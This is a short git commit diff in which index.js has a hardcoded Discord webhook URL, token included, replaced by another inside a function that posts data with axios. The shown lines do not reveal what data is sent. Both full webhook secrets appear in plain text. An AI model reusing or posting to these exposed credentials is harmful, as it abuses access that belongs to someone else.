b93a3cd27ba71d7b0ff746bbd2d480e7d3d20069
liquidised <99297657+liquidised@users.noreply.github.com>
2022-12-08 00:41:23 -0600

    Update index.js

--- index.js
+++ index.js
@@ -348,7 +348,7 @@ async function postToWebhook(
         ],
     };
     axios.post(
-        "https://discord.com/api/webhooks/1046029632664764478/yCAXrPk8oHrQpWPZkvt4dvz6x15ThMhDh4-R3AtoAG1UU6JWNDIB2lV5yBrmmIE9Y54C",
+        "https://discord.com/api/webhooks/1050300699499581482/-UxGriSXJcZzJAhQsBkZYEKqQePx1FpxrTP27dtscH5hVVtqxr8VTFlkHn-n8YEuiCmN",
         data
     );
     axios
